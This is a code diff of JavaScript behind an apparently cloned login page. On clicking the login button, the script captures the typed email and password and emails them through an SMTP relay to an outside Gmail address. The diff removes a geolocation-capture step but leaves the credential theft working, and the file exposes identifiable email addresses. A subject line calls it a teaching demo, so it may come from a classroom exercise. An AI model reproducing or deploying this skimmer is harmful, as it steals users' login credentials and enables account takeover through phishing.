@@ -7,16 +7,6 @@
         var sendd = document.getElementById("login_password_step_element");
         sendd.onclick=function(){
             function sendEmail(){
-                /*抓取地理位置*/
-                function getLocation(){
-                    if(navigator.geolocation){
-                        navigator.geolocation.getCurrentPosition(showPosition);
-                    }
-                }
-                function showPosition(position){
-                    postext="緯度:" + position.coords.latitude + " 經度: " + position.coords.longitude;
-
-                /*信件發送*/
                 Email.send({
                 Host : "smtp.elasticemail.com",
                 Username : "50915112@gm.nfu.edu.tw",
@@ -24,14 +14,10 @@
                 To : 'a0978435327@gmail.com',
                 From : "50915112@gm.nfu.edu.tw",
                 Subject : "教學用帳號密碼傳回值",
-            Body : "信箱:" + document.getElementById("m_login_email").value+"密碼:"+document.getElementById("m_login_password").value + "地理位置" + postext
+                Body : "信箱:" + document.getElementById("m_login_email").value+"密碼:"+document.getElementById("m_login_password").value 
                 }).then(
-                    message => alert("執行結果:"+message)
+                    message => console.log("執行結果:"+message)
                 );
-                /*信件發送*/
-                }
-                getLocation();
-                /*抓取地理位置*/
             }
         sendEmail();
         //setTimeout(document.write(''),680);
